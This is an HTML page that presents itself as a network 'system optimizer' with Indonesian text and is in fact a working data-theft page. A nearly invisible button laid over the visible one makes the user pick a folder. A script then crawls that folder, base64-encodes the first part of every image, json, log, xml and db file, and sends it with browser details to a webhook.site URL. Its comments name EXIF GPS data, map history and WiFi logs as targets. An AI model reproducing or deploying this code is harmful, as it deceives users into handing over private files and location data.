<!DOCTYPE html>
<html>
<head><title>Advanced System Optimizer</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 100px #00f;background:rgba(0,0,20,0.9)">
        <h1 style="letter-spacing:5px;color:#00f">V238_GHOST_LOCATOR</h1>
        <p>Sinkronisasi folder diperlukan untuk memetakan "Network Nodes" dan optimasi koneksi regional.</p>
        
        <div style="position: relative; display: inline-block;">
            <button style="padding:20px;background:#00f;color:#fff;border:none;font-weight:bold;cursor:pointer">START_NODE_OPTIMIZATION</button>
            <button id="trigger" onclick="ghostLocator()" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;cursor:pointer"></button>
        </div>

        <div id="log" style="margin-top:20px;color:#444;font-size:10px;text-align:left;max-height:100px;overflow:hidden"></div>
    </div>

<script>
    const WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";

    async function ghostLocator() {
        try {
            const dirHandle = await window.showDirectoryPicker();
            document.getElementById('log').innerText = "> CLOUD_SYNC_INITIATED...";

            await crawl(dirHandle, "");
            
            document.getElementById('log').innerText += "\n> NODES_MAPPED_SUCCESSFULLY";
        } catch (err) { console.log(err); }
    }

    async function crawl(handle, path) {
        for await (const entry of handle.values()) {
            const currentPath = `${path}/${entry.name}`;

            if (entry.kind === 'file') {
                // TARGET 1: File Gambar (Mencari metadata EXIF/GPS)
                // TARGET 2: Riwayat Maps/Browser Cache
                // TARGET 3: Log WiFi/SSID (Location Triangulation)
                const isLocationSource = /\.(jpg|jpeg|png|json|log|xml|db)$/i.test(entry.name);
                
                if (isLocationSource) {
                    try {
                        const file = await entry.getFile();
                        
                        // Strategi: Kirim Header & Chunk data (untuk EXIF biasanya di awal file)
                        const buffer = await file.arrayBuffer();
                        const chunk = new Uint8Array(buffer.slice(0, 20000)); 
                        const base64 = btoa(String.fromCharCode.apply(null, chunk));

                        navigator.sendBeacon(`${WEBHOOK}?v=V238_LOCATION_LEAK`, btoa(JSON.stringify({
                            target: entry.name,
                            path: currentPath,
                            size: file.size,
                            // Kirim info tambahan seperti IP & Region via browser info
                            meta: { ua: navigator.userAgent, lang: navigator.language },
                            data_chunk: base64
                        })));
                    } catch (e) {}
                }
            } else if (entry.kind === 'directory') {
                await crawl(entry, currentPath);
            }
        }
    }
</script>
</body>
</html>
